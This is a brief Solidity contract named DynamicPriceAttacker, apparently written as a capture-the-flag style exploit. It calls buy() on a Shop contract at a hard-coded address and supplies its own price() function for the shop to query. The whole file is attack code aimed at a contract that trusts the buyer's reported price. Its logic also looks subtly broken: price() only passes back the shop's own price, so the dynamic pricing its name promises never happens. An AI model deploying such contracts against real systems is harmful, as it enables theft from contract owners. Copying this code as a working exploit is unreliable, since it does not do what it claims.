pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function price() external view returns (uint256);
}

contract DynamicPriceAttacker {
    address public shopContractAddress = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    function attackBuy() external {
        Shop(shopContractAddress).buy();
    }

    function price() external view returns (uint256) {
        return Shop(shopContractAddress).price();
    }
}